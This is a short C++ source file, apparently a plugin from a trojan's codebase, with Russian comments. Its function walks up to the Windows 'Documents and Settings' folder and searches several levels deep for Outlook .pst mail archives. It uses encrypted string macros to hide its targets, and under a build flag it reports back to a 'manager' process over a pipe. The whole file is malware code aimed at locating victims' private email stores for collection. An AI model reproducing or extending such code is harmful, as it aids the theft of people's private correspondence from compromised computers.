#include "plugins.h"
#include "other.h"
#include "main.h"
#include "core\pipe.h"

namespace Plugins
{

DWORD WINAPI FindOutlookFiles( void* )
{
	StringBuilderStack<MAX_PATH> path;
	Path::GetCSIDLPath( CSIDL_COMMON_DOCUMENTS, path );
	Path::GetPathName(path); //убираем Application Data
	Path::GetPathName(path); //All users, остается только Documents and Settings
	StringBuilderStack<16> mask( _CS_(".pst") );
	StringBuilderStack<16> name( _CS_("outlook") );
	FindFiles( path, mask, 3, name );
#ifdef PLUGINS_FIND_OUTLOOK_FILES_EXIT
	Delay(20000);
	PipeClient::Send( Config::nameManager, PipeServer::CmdDisconnect, 0, 0 );
#endif
	return true;
}

}
